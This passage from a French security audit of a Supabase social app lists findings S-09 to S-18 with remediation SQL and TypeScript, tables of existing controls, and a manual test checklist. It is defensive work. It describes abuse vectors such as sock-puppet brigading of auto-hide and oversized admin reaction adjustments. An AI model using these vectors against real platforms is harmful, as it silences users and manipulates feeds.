**Description.** La RPC `admin_eradicate_social_user_content(p_target_user_id, p_actor_id, p_note)` n'accepte **aucune idempotency key**. Si un admin clique deux fois (rage click, network retry, double-tap React Native), deux appels consécutifs peuvent :
- Créer deux `social_moderation_events` distincts pour la même action.
- Cascader deux fois la résolution des reports liés.
- Doubler le ban dans `user_bans` (si pas de contrainte unique).

L'opération est **destructive et non-réversible** : cascade `moderation_state` → `'removed'` sur posts/comments, asset_paths listés pour suppression storage.

**Exploitation.** Pas un vecteur d'attaque actif, mais un **risque opérationnel critique** : un double-clic sur l'UI admin pendant la latence réseau (1-2s typique sur eradicate qui touche N posts) → double exécution → audit logs incohérents, retry de la cascade de suppressions sur des rows déjà removed (état idempotent côté DB mais log dupliqué).

**Impact.**
- Audit logs faussés (deux entrées pour une action).
- Difficulté post-incident à reconstituer la timeline (S-05 amplifie ce risque).
- Si la 2e exécution échoue en plein milieu (timeout), état partiel non documenté.

**Recommandation.** Ajouter un paramètre `p_idempotency_key uuid` (généré côté client / Edge Function) + colonne `idempotency_key uuid UNIQUE` sur `admin_audit_events`. La 2e exécution avec la même clé renvoie le résultat de la 1re sans rejouer.

Extrait SQL :

```sql
-- Migration : 20260520_admin_idempotency_keys.sql
ALTER TABLE public.admin_audit_events
  ADD COLUMN IF NOT EXISTS idempotency_key uuid;

CREATE UNIQUE INDEX IF NOT EXISTS uq_admin_audit_events_idempotency_key
  ON public.admin_audit_events (idempotency_key)
  WHERE idempotency_key IS NOT NULL;

-- Mettre à jour la RPC admin_eradicate_social_user_content :
CREATE OR REPLACE FUNCTION public.admin_eradicate_social_user_content(
  p_target_user_id uuid,
  p_actor_id uuid,
  p_idempotency_key uuid,
  p_note text DEFAULT NULL
)
RETURNS TABLE (...)
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public, auth
AS $$
DECLARE
  v_existing record;
BEGIN
  -- Idempotency check : si la clé existe déjà, renvoyer le résultat précédent.
  SELECT metadata INTO v_existing
    FROM public.admin_audit_events
    WHERE idempotency_key = p_idempotency_key
    LIMIT 1;
  IF FOUND THEN
    -- Retourner depuis metadata stocké (à structurer dans le log précédent)
    RETURN QUERY SELECT
      (v_existing.metadata->>'operation_id')::uuid,
      (v_existing.metadata->>'event_id')::uuid,
      p_target_user_id,
      (v_existing.metadata->>'post_count')::integer,
      -- ... etc
    ;
    RETURN;
  END IF;
  -- ... logique existante d'eradication, suivie d'un INSERT dans admin_audit_events
  -- avec idempotency_key = p_idempotency_key
END;
$$;
```

Côté Edge Function ([social-admin-eradicate-user/index.ts](supabase/functions/social-admin-eradicate-user/index.ts)) :

```ts
const requestBody = parseSocialAdminEradicateUserRequest(...);
const idempotencyKey = req.headers.get('Idempotency-Key') ?? crypto.randomUUID();
// ... appel à la RPC avec p_idempotency_key: idempotencyKey
```

Côté frontend ([services/socialAdmin.ts](services/socialAdmin.ts)), générer un UUID stable par tentative (regénéré sur retry uniquement).

**Statut :** ✅ Corrigé 2026-05-19 (Wave 2 PR #7 + Wave 3 follow-up). Migration [20260520120000_admin_idempotency_keys.sql](supabase/migrations/20260520120000_admin_idempotency_keys.sql) ajoute `admin_audit_events.idempotency_key uuid UNIQUE`. La RPC `admin_eradicate_social_user_content` accepte `p_idempotency_key` et `p_request_id`, utilise un `pg_advisory_xact_lock` pour serialiser les retries concurrents, et lève `P0009 idempotent_replay_already_processed` avec le metadata du précédent audit event en HINT. **Pattern étendu aux 2 autres Edge Functions admin** : `social-admin-moderate-user` et `social-admin-adjust-post-reactions` propagent maintenant `Idempotency-Key` avec un pattern différent (INSERT audit `.intent` AVANT l'action, le 23505 UNIQUE remonte en 409 `idempotent_request_already_processed` via [logAdminAuditEvent](supabase/functions/_shared/phase2Auth.ts) qui distingue désormais le code postgres `23505`). Rate limit pattern ajusté à `*.intent` pour ne pas compter doublement avec le log `.outcome` best-effort. Services [moderateSocialUser](services/socialAdmin.ts), [adjustSocialPostReactions](services/socialAdmin.ts), [eradicateSocialUser](services/socialAdmin.ts) génèrent un UUID stable via `generateAdminIdempotencyKey()`.

---

### S-10 — CORS retourne `*` pour les requêtes sans header Origin [P2 — Moyen]

**Fichier :** [supabase/functions/_shared/cors.ts:67-97](supabase/functions/_shared/cors.ts:67)

```ts
const baseHeaders: Record<string, string> = !origin
  ? {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Client-Info, Apikey',
    }
  : (() => { ... allowlist check ... })();
```

**Description.** Pour les requêtes sans header `Origin` (mobile natif, S2S, curl), `Allow-Origin: *` est renvoyé sans `Allow-Credentials`. Le commentaire en code justifie correctement le choix : JWT bearer auth, pas de cookie cross-origin, donc pas de CSRF cookie-based exploitable.

**Pourquoi P2.** Risque résiduel faible mais la posture est plus laxe que nécessaire. Un navigateur qui omet `Origin` (cas atypique, ex : `<img>` sans referrer) reçoit aussi `*`. Préférable d'expliciter `null` au lieu de wildcard.

**Recommandation.** Renvoyer `Access-Control-Allow-Origin: null` quand l'Origin est absent. N'empêche aucun usage légitime (mobile natif ignore CORS de toute façon).

```ts
// cors.ts
const baseHeaders: Record<string, string> = !origin
  ? {
      'Access-Control-Allow-Origin': 'null',  // ← au lieu de '*'
      'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Client-Info, Apikey',
    }
  : (() => { ... })();
```

**Statut :** ✅ Corrigé 2026-05-19 (Wave 3, PR #9). [cors.ts:67-97](supabase/functions/_shared/cors.ts) renvoie maintenant `Access-Control-Allow-Origin: null` au lieu de `*` quand l'Origin est absent. Posture renforcée sans régression UX (mobile natif ignore CORS de toute façon). Tests : `S-10:*` dans [cors.test.ts](supabase/functions/_shared/cors.test.ts).

---

### S-11 — CORS allowlist case-sensitive [P2 — Moyen]

**Fichier :** [supabase/functions/_shared/cors.ts:20-36](supabase/functions/_shared/cors.ts:20)

```ts
function isOriginAllowed(origin: string): boolean {
  // ...
  return allowedOrigins.includes(origin);  // ❌ case-sensitive
}
```

**Description.** `allowedOrigins.includes(origin)` compare strictement. RFC 6454 stipule que le hostname est case-insensitive (schéma et port le sont aussi). Un déploiement avec une env var `ALLOWED_ORIGINS=https://MyApp.com` ne matchera pas un browser envoyant `https://myapp.com` (et vice-versa).

**Exploitation.** Pas un vecteur d'attaque, mais une **régression silencieuse** : si la production utilise un domaine avec un caractère uppercase et qu'un dev change le casing, les requêtes web sont bloquées en CORS.

**Recommandation.** Normaliser les deux côtés en lowercase pour le matching :

```ts
const allowedOriginsLower = allowedOriginsEnv
  .split(',')
  .map((origin) => origin.trim().toLowerCase())
  .filter((origin) => origin.length > 0);

function isOriginAllowed(origin: string): boolean {
  if (allowedOriginsLower.length === 0) {
    console.warn('[CORS] No origins configured in ALLOWED_ORIGINS. Denying by default.');
    return false;
  }
  if (allowedOriginsLower.includes('*')) {
    if (isProductionEnvironment()) {
      console.error('[CORS] Refusing wildcard ALLOWED_ORIGINS in production.');
      return false;
    }
    return true;
  }
  return allowedOriginsLower.includes(origin.toLowerCase());
}
```

**Statut :** ✅ Corrigé 2026-05-19 (Wave 3, PR #9). [cors.ts:10-13](supabase/functions/_shared/cors.ts) normalise les origins de l'allowlist en lowercase au chargement, et `isOriginAllowed` compare l'Origin entrant en lowercase. Tests : `S-11:*` dans [cors.test.ts](supabase/functions/_shared/cors.test.ts).

---

### S-12 — Auto-hide threshold : pas de pondération anti-brigading [P2 — Moyen]

**Fichier :** [supabase/functions/_shared/phase2Moderation.ts:100](supabase/functions/_shared/phase2Moderation.ts:100) + trigger `apply_social_report_thresholds` dans [20260406210000_phase3_social_mvp_and_moderation.sql](supabase/migrations/20260406210000_phase3_social_mvp_and_moderation.sql)

**Description.** Le seuil d'auto-hide est de 3 **reports uniques** en 24h (déduplication par `reporter_id`, self-report exclu). Trois comptes coordonnés suffisent pour cacher n'importe quel post. La protection existante (`reporter_id <> target_author_id` via `assertReportableTargetNotOwnedByUser`) bloque seulement l'auto-report.

**Vecteurs d'abus typiques :**
- **Brigading manuel** : un groupe organisé identifie 3-4 cibles, chaque compte report.
- **Sock-puppets** : un seul attaquant crée 3 comptes neufs (rate limit signup non corrélé) → auto-hide à la chaîne.
- **Vengeance ciblée** : ex-couple, conflit pro, etc.

**Recommandation.** Pondérer le compteur 24h par :
1. **Âge du compte** (un compte créé < 7j compte 0.5, < 1j compte 0.25).
2. **Historique du reporter** (un user avec >= 10 reports `dismissed` historiquement compte 0.25).
3. **Diversité réseau** : optionnellement, si plusieurs reports viennent du même `signup_ip` (table `signup_ip_records` existante), compter comme 1 seul.

Extrait SQL à intégrer dans le trigger `apply_social_report_thresholds` :

```sql
-- Remplacer le COUNT(DISTINCT reporter_id) actuel par une somme pondérée :
CREATE OR REPLACE FUNCTION public.compute_weighted_report_count(
  p_target_type text,
  p_target_id uuid,
  p_window interval DEFAULT '24 hours'
)
RETURNS numeric
LANGUAGE sql
STABLE
AS $$
  SELECT COALESCE(SUM(weight), 0)::numeric
  FROM (
    SELECT
      r.reporter_id,
      CASE
        WHEN up.created_at > now() - INTERVAL '1 day' THEN 0.25
        WHEN up.created_at > now() - INTERVAL '7 days' THEN 0.5
        WHEN (
          SELECT COUNT(*) FROM public.social_reports r2
          WHERE r2.reporter_id = r.reporter_id
            AND r2.workflow_status = 'dismissed'
        ) >= 10 THEN 0.25
        ELSE 1.0
      END AS weight
    FROM public.social_reports r
    JOIN public.user_profiles up ON up.id = r.reporter_id
    WHERE r.created_at > now() - p_window
      AND r.target_type = p_target_type
      AND (
        (p_target_type = 'post' AND r.target_post_id = p_target_id)
        OR (p_target_type = 'comment' AND r.target_comment_id = p_target_id)
      )
    GROUP BY r.reporter_id, up.created_at
  ) weighted;
$$;
```

Puis dans le trigger : utiliser `public.compute_weighted_report_count(...) >= 3` au lieu du COUNT DISTINCT.

**Statut :** ✅ Livré en shadow mode 2026-05-19 (Wave 3, PR #14). Migration [20260522121000_weighted_report_count.sql](supabase/migrations/20260522121000_weighted_report_count.sql) ajoute la fonction SQL `compute_weighted_report_count` avec les coefficients (compte <1j=0.25, <7j=0.5, dismissed≥10=0.25, sinon 1.0) + table `social_report_threshold_shadow` pour logger pendant 7+ jours raw vs weighted. **La trigger `apply_social_report_thresholds` n'est PAS encore basculée** : activation à faire dans une migration ultérieure après validation produit des coefficients via analyse du log shadow.

---

### S-13 — Limites de longueur sur `share_payload_snapshot.*` [P2 — Moyen]

**Fichier :** [supabase/functions/_shared/phase2Contracts.ts:204-298](supabase/functions/_shared/phase2Contracts.ts:204)

**Description.** Déjà identifié dans `BACKEND_SECURITY_AUDIT.md` B-03 avec statut "✅ Corrigé". Cet audit recommande une **relecture rapide** pour confirmer que :
- `headline`, `variantLabel`, `footerBrand`, `footerCta`, `statusBadgeLabel`, `scoreLabel` ≤ 200 chars
- `accentColor`, `accentColorSecondary` matchent `/^#[0-9a-fA-F]{6}$/`
- `metrics` array max 10 items
- `metrics[].label`, `metrics[].value`, `metrics[].valueVariant` ≤ 100 chars

**Recommandation.** Si OK, marquer S-13 comme "✅ couvert par B-03". Sinon, appliquer les bornes manquantes.

**Statut :** ✅ Vérifié 2026-05-19 (Wave 3, PR #10). Confirmation par lecture de [phase2Contracts.ts:658-866](supabase/functions/_shared/phase2Contracts.ts:658) : toutes les bornes prévues par B-03 sont en place (`SHARE_PAYLOAD_TEXT_MAX_LENGTH=200`, `SHARE_PAYLOAD_METRIC_FIELD_MAX_LENGTH=100`, `SHARE_PAYLOAD_METRICS_MAX_COUNT=10`, `SHARE_PAYLOAD_ACCENT_COLOR_PATTERN=/^#[0-9a-fA-F]{6}$/`). Aucune action complémentaire requise.

---

### S-14 — Reservations d'upload non purgées au logout [P2 — Moyen]

**Fichier :** Système de réservation dans [20260424090000_security_hardening.sql](supabase/migrations/20260424090000_security_hardening.sql)

**Description.** Une réservation `social_upload_reservations` a une TTL de 30min. Si un user se déconnecte avant d'avoir consommé sa réservation, celle-ci reste valide jusqu'à expiration. Un attaquant qui aurait volé un `upload_id` (peu probable car nécessite déjà l'asset_path complet) pourrait potentiellement le consommer si le user revient se reconnecter et oublie la pré-réservation.

**Pourquoi P2.** Vecteur très étroit : nécessite le `upload_id` ET un JWT valide pour appeler `social-create-post`. L'attaquant aurait besoin de la session du user → autres attaques plus directes possibles.

**Recommandation.** Trigger logout dans le frontend qui appelle une RPC `release_pending_social_upload_reservations(user_id)` :

```sql
CREATE OR REPLACE FUNCTION public.release_pending_social_upload_reservations(
  p_user_id uuid
)
RETURNS integer
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public, auth
AS $$
DECLARE
  v_count integer;
BEGIN
  IF auth.uid() IS NULL OR auth.uid() <> p_user_id THEN
    RAISE EXCEPTION 'Only the owner can release their pending reservations';
  END IF;
  UPDATE public.social_upload_reservations
    SET status = 'released', released_at = now()
    WHERE user_id = p_user_id
      AND status = 'reserved'
      AND expires_at > now();
  GET DIAGNOSTICS v_count = ROW_COUNT;
  RETURN v_count;
END;
$$;

REVOKE ALL ON FUNCTION public.release_pending_social_upload_reservations(uuid) FROM PUBLIC;
GRANT EXECUTE ON FUNCTION public.release_pending_social_upload_reservations(uuid) TO authenticated;
```

Côté frontend ([contexts/AuthContext.tsx](contexts/AuthContext.tsx)), appeler dans le `signOut` :

```ts
// avant supabase.auth.signOut()
if (user?.id) {
  await supabase.rpc('release_pending_social_upload_reservations', { p_user_id: user.id }).catch(() => {});
}
```

**Statut :** ✅ Corrigé 2026-05-19 (Wave 3, PR #11). Migration [20260523120000_release_pending_social_upload_reservations.sql](supabase/migrations/20260523120000_release_pending_social_upload_reservations.sql) ajoute la valeur `released` à `status`, colonne `released_at`, et RPC `release_pending_social_upload_reservations(p_user_id)` avec vérification `auth.uid() = p_user_id`. [contexts/AuthContext.tsx:signOut](contexts/AuthContext.tsx) appelle la RPC au logout (best-effort, non-bloquant).

---

### S-15 — Admin reaction adjustments : pas de borne serveur [P1 — Haut]

**Fichier :** [supabase/functions/_shared/phase2Contracts.ts:1397-1437](supabase/functions/_shared/phase2Contracts.ts:1397) + [supabase/migrations/20260418173000_social_admin_eradication_and_reaction_adjustments.sql:438-494](supabase/migrations/20260418173000_social_admin_eradication_and_reaction_adjustments.sql:438)

```ts
// phase2Contracts.ts:1407-1426
const adminLikeAdjustment = readOptionalNumber(payload.admin_like_adjustment);
// ...
if (adminLikeAdjustment === null || !Number.isInteger(adminLikeAdjustment)) {
  throw new Phase2HttpError(400, 'invalid_payload', 'admin_like_adjustment must be an integer');
}
// ❌ aucune borne min/max
```

```sql
-- set_social_post_admin_reaction_adjustments
UPDATE public.social_posts AS social_post
SET
  admin_like_adjustment = COALESCE(p_admin_like_adjustment, 0),  -- ❌ pas de clamp
  admin_dislike_adjustment = COALESCE(p_admin_dislike_adjustment, 0),
  updated_at = now()
WHERE social_post.id = p_post_id
```

**Description.** Côté Edge Function le contract accepte tout entier. Côté SQL la RPC stocke directement la valeur sans clamp. Le type `integer` PostgreSQL accepte de -2 147 483 648 à +2 147 483 647. Combiné à `like_count` qui peut grimper légitimement, `get_effective_social_reaction_count(raw, adjustment)` peut overflower :

```sql
-- public.get_effective_social_reaction_count :
SELECT GREATEST(0, COALESCE(p_raw_count, 0) + COALESCE(p_admin_adjustment, 0));
-- si raw=1_500_000_000 et adjustment=1_500_000_000 → overflow integer
```

**Exploitation.** Admin compromis (ou bug interne) :
- Force un post arbitrairement haut dans le feed (`admin_like_adjustment = 1_000_000`).
- Fait disparaître un post (`admin_dislike_adjustment = 1_000_000` → rank négatif si formula).
- Provoque overflow integer → exception PostgreSQL imprévisible sur les lectures du feed.

Le rate limit (60/h) limite la cadence mais pas la magnitude.

**Impact.**
- Manipulation du feed (boost/enterrement de posts) sans plafond.
- Overflow integer → erreurs sur `get_social_feed_page` jusqu'à correction manuelle.

**Recommandation.** Borner côté contract Edge Function + CHECK constraint SQL.

Côté contract :

```ts
// phase2Contracts.ts
const SOCIAL_ADMIN_REACTION_ADJUSTMENT_MIN = -10_000;
const SOCIAL_ADMIN_REACTION_ADJUSTMENT_MAX = 10_000;

function assertReactionAdjustmentRange(value: number, fieldName: string) {
  if (value < SOCIAL_ADMIN_REACTION_ADJUSTMENT_MIN || value > SOCIAL_ADMIN_REACTION_ADJUSTMENT_MAX) {
    throw new Phase2HttpError(
      400,
      'invalid_payload',
      `${fieldName} must be between ${SOCIAL_ADMIN_REACTION_ADJUSTMENT_MIN} and ${SOCIAL_ADMIN_REACTION_ADJUSTMENT_MAX}`,
    );
  }
}

// dans parseSocialAdminAdjustPostReactionsRequest :
if (adminLikeAdjustment === null || !Number.isInteger(adminLikeAdjustment)) {
  throw new Phase2HttpError(400, 'invalid_payload', 'admin_like_adjustment must be an integer');
}
assertReactionAdjustmentRange(adminLikeAdjustment, 'admin_like_adjustment');

if (adminDislikeAdjustment === null || !Number.isInteger(adminDislikeAdjustment)) {
  throw new Phase2HttpError(400, 'invalid_payload', 'admin_dislike_adjustment must be an integer');
}
assertReactionAdjustmentRange(adminDislikeAdjustment, 'admin_dislike_adjustment');
```

Côté SQL :

```sql
-- Migration : 20260521_clamp_social_admin_reaction_adjustments.sql
ALTER TABLE public.social_posts
  ADD CONSTRAINT social_posts_admin_like_adjustment_range
    CHECK (admin_like_adjustment BETWEEN -10000 AND 10000),
  ADD CONSTRAINT social_posts_admin_dislike_adjustment_range
    CHECK (admin_dislike_adjustment BETWEEN -10000 AND 10000);

-- Et clamp défensif dans la RPC :
UPDATE public.social_posts AS social_post
SET
  admin_like_adjustment = LEAST(10000, GREATEST(-10000, COALESCE(p_admin_like_adjustment, 0))),
  admin_dislike_adjustment = LEAST(10000, GREATEST(-10000, COALESCE(p_admin_dislike_adjustment, 0))),
  updated_at = now()
WHERE social_post.id = p_post_id
```

Côté frontend ([screens/AdminSocialModerationScreen.tsx:193](screens/AdminSocialModerationScreen.tsx:193)), valider la plage avant submit pour fournir un message d'erreur immédiat à l'admin légitime.

**Statut :** ✅ Corrigé 2026-05-19 (Wave 2, PR #4). Migration [20260521120000_clamp_social_admin_reaction_adjustments.sql](supabase/migrations/20260521120000_clamp_social_admin_reaction_adjustments.sql) ajoute des CHECK constraints `BETWEEN -10000 AND 10000` sur `social_posts.admin_*_adjustment` + clamp défensif dans la RPC. Contract [phase2Contracts.ts:assertReactionAdjustmentRange](supabase/functions/_shared/phase2Contracts.ts) valide côté Edge Function. Frontend [adminModerationUtils.ts:parseAdminReactionAdjustmentInput](components/social/admin/adminModerationUtils.ts) borne aussi côté UI pour feedback immédiat.

---

### S-16 — Pagination keyset cursor : validation de format [P3 — Faible]

**Fichier :** [supabase/migrations/20260524120000_social_feed_keyset.sql](supabase/migrations/20260524120000_social_feed_keyset.sql)

**Description.** Le cursor de pagination du feed est de la forme `<rank_score>:<post_id>`, parsé via `SPLIT_PART`. Vérifier qu'un cursor malformé (`'\x00:abc'`, longueur excessive, caractères non-numériques sur le score) :
- Ne plante pas la function avec une exception non-rattrapée.
- Ne provoque pas un OOM côté Postgres via une string excessive.
- Ne permet pas d'injection via les paramètres SQL (peu probable car typé `text`).

**Recommandation.** Ajouter une validation regex en début de fonction :

```sql
DECLARE
  v_cursor_pattern constant text := '^[0-9]+(\.[0-9]+)?:[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$';
BEGIN
  IF p_cursor IS NOT NULL AND p_cursor !~ v_cursor_pattern THEN
    RAISE EXCEPTION 'Invalid cursor format' USING ERRCODE = '22023';
  END IF;
  -- ... reste du SPLIT_PART
```

**Statut :** ✅ Vérifié + helper ajouté 2026-05-19 (Wave 3, PR #12). Vérification : le bloc EXCEPTION existant dans `get_social_feed_page` ([20260524120000_social_feed_keyset.sql:115-127](supabase/migrations/20260524120000_social_feed_keyset.sql)) protège déjà contre les cursors malformés (fallback silent à first page). En complément défense en profondeur, migration [20260525120000_harden_social_feed_cursor.sql](supabase/migrations/20260525120000_harden_social_feed_cursor.sql) ajoute l'helper `is_valid_social_feed_keyset_cursor(p_cursor)` qui valide longueur (≤200) + format regex `^-?\d+(\.\d+)?:[uuid]$`. Non encore branché dans la fonction principale pour éviter une régression sur la logique de scoring complexe — disponible pour futurs callers.

---

### S-17 — Nonce race condition (worker signature) [P3 — Faible]

**Fichier :** [supabase/functions/_shared/phase2Auth.ts:318-357](supabase/functions/_shared/phase2Auth.ts:318)

**Description.** Window microscopique entre la vérification de signature et l'insertion du nonce dans `edge_request_nonces`. Deux requêtes concurrentes avec le même nonce passent toutes deux la vérif signature, puis l'une réussit l'insert et l'autre récupère un `23505` (unique constraint violation) → 401 "replayed_worker_nonce".

**Pourquoi P3.** Le mécanisme actuel **fonctionne correctement** : une seule requête est honorée, la seconde est rejetée. Mais l'ordre n'est pas déterministe. Pour un nonce généré par un worker légitime, cela ne devrait jamais se produire (chaque worker génère un nonce unique).

**Recommandation.** Note documentaire uniquement. Si une amélioration est souhaitée, déplacer l'insertion du nonce dans une fonction `RPC` SECURITY DEFINER qui combine `INSERT ... ON CONFLICT DO NOTHING` + `RETURNING` pour faire l'atomicity check-and-insert en une seule opération.

**Statut :** ℹ️ Documenté. Pas d'action requise.

---

### S-18 — Soft-delete retention : pas de purge automatique [P3 — Faible]

**Fichier :** `social_posts.deleted_at`, `social_comments.deleted_at` (toutes les migrations social)

**Description.** Les posts/commentaires soft-deleted restent indéfiniment en base. Pas de job pg_cron / Edge Function planifiée pour purger. Risque GDPR si un user fait une demande de suppression complète (article 17 RGPD) → le soft-delete n'est pas une suppression effective.

**Recommandation.** Job pg_cron (extension à activer si pas déjà) qui hard-delete les rows soft-deletées depuis > 30 jours :

```sql
-- Migration : 20260601_social_soft_delete_retention.sql
CREATE OR REPLACE FUNCTION public.purge_old_soft_deleted_social_content()
RETURNS TABLE (purged_posts integer, purged_comments integer)
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public, auth
AS $$
DECLARE
  v_posts integer;
  v_comments integer;
BEGIN
  WITH deleted AS (
    DELETE FROM public.social_posts
      WHERE deleted_at IS NOT NULL
        AND deleted_at < now() - INTERVAL '30 days'
      RETURNING id
  )
  SELECT COUNT(*) INTO v_posts FROM deleted;

  WITH deleted AS (
    DELETE FROM public.social_comments
      WHERE deleted_at IS NOT NULL
        AND deleted_at < now() - INTERVAL '30 days'
      RETURNING id
  )
  SELECT COUNT(*) INTO v_comments FROM deleted;

  RETURN QUERY SELECT v_posts, v_comments;
END;
$$;

REVOKE ALL ON FUNCTION public.purge_old_soft_deleted_social_content() FROM PUBLIC;
GRANT EXECUTE ON FUNCTION public.purge_old_soft_deleted_social_content() TO service_role;

-- Planification quotidienne (nécessite pg_cron activé) :
SELECT cron.schedule(
  'purge-soft-deleted-social',
  '0 3 * * *',
  $$SELECT public.purge_old_soft_deleted_social_content()$$
);
```

Penser aussi à purger les `asset_path` correspondants dans le bucket `social-posts` (via Edge Function listant les retours de la RPC).

**Statut :** ✅ Corrigé 2026-05-19 (Wave 3 PR #13 + follow-up). Migration [20260601120000_social_soft_delete_retention.sql](supabase/migrations/20260601120000_social_soft_delete_retention.sql) crée la RPC `purge_old_soft_deleted_social_content(p_retention_days)` qui hard-delete les rows `deleted_at < now() - p_retention_days` et retourne les `asset_paths` à purger. Planification quotidienne à 03:00 UTC via `pg_cron.schedule` (le `DO` block vérifie la disponibilité de l'extension et alerte les ops si absent). Garde de validation : retention ∈ [7, 365] jours. **Edge Function** [purge-soft-deleted-social-assets](supabase/functions/purge-soft-deleted-social-assets/index.ts) ajoutée : appelle la RPC puis purge les `asset_paths` retournés du bucket `social-posts`, protégée par signature worker HMAC ou auth admin (réutilise `requireSocialModerationWorkerOrAdmin`).

---

## Contrôles positifs observés

Maturité globale de la posture social — à reconnaître dans tout suivi :

| ID | Contrôle | Référence |
|----|----------|-----------|
| ✅ C-01 | `normalizeSocialText` rejette HTML-like, control chars, bidi, invisibles, schemes dangereux (`javascript:`, `vbscript:`, `data:`) | [phase2Utils.ts:62-114](supabase/functions/_shared/phase2Utils.ts:62) |
| ✅ C-02 | `validateStableSocialAssetPath` bloque `data:`, `file://`, `exp://`, path traversal (`?`, `#`, leading `/`, scan-images cross-bucket) | [phase2Utils.ts:253-300](supabase/functions/_shared/phase2Utils.ts:253) |
| ✅ C-03 | `account_tier` protégé par RLS `WITH CHECK` + trigger BEFORE UPDATE → auto-promotion bloquée à deux niveaux | [20260426120000_restore_account_tier_protection.sql](supabase/migrations/20260426120000_restore_account_tier_protection.sql) |
| ✅ C-04 | Upload sanitization : `assertImageWithinPixelBudget` (decompression bomb) + `stripImageMetadata` (EXIF/GPS scrub) | [social-create-post/index.ts:166-167](supabase/functions/social-create-post/index.ts:166) |
| ✅ C-05 | Storage bucket policies AAL2-gated (rétrogradé AAL1 par décision produit S-06, mais bucket reste gated par RLS sur reservation) | [20260424090000_security_hardening.sql](supabase/migrations/20260424090000_security_hardening.sql) |
| ✅ C-06 | Outbound webhook HMAC SHA-256 avec timing-safe compare | [phase2Webhook.ts:32-91](supabase/functions/_shared/phase2Webhook.ts:32), [phase2Auth.ts:196-206](supabase/functions/_shared/phase2Auth.ts:196) |
| ✅ C-07 | Worker signature inbound : HMAC + timestamp tolerance 5min + nonce hash replay protection | [phase2Auth.ts:359-423](supabase/functions/_shared/phase2Auth.ts:359) |
| ✅ C-08 | Inserts/updates explicites (champs listés un par un) — pas de mass assignment via spread de body utilisateur (cf S-03 ci-dessus) | toutes les Edge Functions social-* |
| ✅ C-09 | `assertNoUnknownKeys` appelé sur tous les payloads parsés | [phase2Utils.ts:116-132](supabase/functions/_shared/phase2Utils.ts:116) |
| ✅ C-10 | Defense-in-depth RPC : `set_social_post_reaction` vérifie `invoker_uid <> p_user_id` (blocks impersonation même via service_role) | [20260406210000_phase3_social_mvp_and_moderation.sql](supabase/migrations/20260406210000_phase3_social_mvp_and_moderation.sql) |
| ✅ C-11 | RLS strict sur `social_posts` SELECT : `(author_id = auth.uid()) OR (deleted_at IS NULL AND moderation_state = 'approved')` | [20260406210000](supabase/migrations/20260406210000_phase3_social_mvp_and_moderation.sql) |
| ✅ C-12 | RPC SECURITY DEFINER : toutes ont `SET search_path = public, auth` explicite | toutes les migrations social |
| ✅ C-13 | Bucket access REVOKED de PUBLIC/anon/authenticated — write uniquement via RPC service_role | [20260418163000_social_unique_post_views.sql](supabase/migrations/20260418163000_social_unique_post_views.sql), etc. |
| ✅ C-14 | Reservation system : tracking explicite consumed/expired, atomic update WHERE status='reserved' AND expires_at>NOW() | [social-create-post/index.ts:239-267](supabase/functions/social-create-post/index.ts:239) |
| ✅ C-15 | Rate limits multi-types : post (3/j), comment (10/h), report (10/j), impression sources limitées | [phase2Social.ts](supabase/functions/_shared/phase2Social.ts), [phase2Utils.ts:13](supabase/functions/_shared/phase2Utils.ts:13) |
| ✅ C-16 | Rejection cooldown (`getSocialRejectionCooldown`) — un user dont les posts sont régulièrement rejetés voit ses créations gelées | [phase2Social.ts](supabase/functions/_shared/phase2Social.ts) |
| ✅ C-17 | Headers de sécurité : `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, HSTS preload, CSP `default-src 'none'`, `Cache-Control: no-store` sur toutes les Edge Functions | [cors.ts:43-65](supabase/functions/_shared/cors.ts:43) |
| ✅ C-18 | Contracts validation : `assertUuidLike`, regex categories, max sizes (`PHASE2_SOCIAL_REQUEST_MAX_BYTES = 32KB`), allowlist reason codes | [phase2Contracts.ts](supabase/functions/_shared/phase2Contracts.ts), [phase2Utils.ts](supabase/functions/_shared/phase2Utils.ts) |
| ✅ C-19 | Reaction RPC : check anti-impersonation `invoker_uid IS NOT NULL AND invoker_uid <> p_user_id` | [20260406210000_phase3_social_mvp_and_moderation.sql](supabase/migrations/20260406210000_phase3_social_mvp_and_moderation.sql) |
| ✅ C-20 | `social_moderation_events` est un audit trail RLS-protégé (lecture admin uniquement, écriture via SECURITY DEFINER) | [phase2Moderation.ts:355-401](supabase/functions/_shared/phase2Moderation.ts:355) |

---

## Annexes

### A. Tableau de remédiation

| ID | Sévérité | Effort | Wave | Statut |
|----|----------|--------|------|--------|
| S-01 | P0 | M | 1 | ✅ 2026-05-19 |
| S-02 | P0 | M | 1 | ✅ 2026-05-19 |
| S-04 | P1 | S | 2 | ✅ 2026-05-19 |
| S-05 | P1 | M | 2 | ✅ 2026-05-19 |
| S-07 | P1 | S | 2 | ✅ 2026-05-19 |
| S-08 | P1 | XS | 2 | ✅ 2026-05-19 |
| S-09 | P1 | M | 2 | ✅ 2026-05-19 |
| S-15 | P1 | S | 2 | ✅ 2026-05-19 |
| S-10 | P2 | XS | 3 | ✅ 2026-05-19 |
| S-11 | P2 | XS | 3 | ✅ 2026-05-19 |
| S-12 | P2 | L | 3 | ✅ Shadow 2026-05-19 |
| S-13 | P2 | XS | 3 | ✅ Vérifié 2026-05-19 |
| S-14 | P2 | S | 3 | ✅ 2026-05-19 |
| S-16 | P3 | XS | 3 | ✅ 2026-05-19 |
| S-17 | P3 | — | — | ℹ️ Doc |
| S-18 | P3 | M | 3 | ✅ 2026-05-19 |

Échelle effort : XS (≤30 min), S (≤2 h), M (≤1 j), L (≤3 j).

### B. Checklist de vérification manuelle

**Post-fix S-01 (webhook response signature)** :
```bash
# Tester que la réponse n8n sans signature est rejetée
curl -X POST "$EDGE_URL/social-report-content" \
  -H "Authorization: Bearer $USER_JWT" \
  -d '{"target_type":"post","target_post_id":"...","reason_code":"spam_repeat"}'
# Stub n8n pour répondre sans X-Webhook-Response-Signature → doit logguer "webhook_response_unsigned"
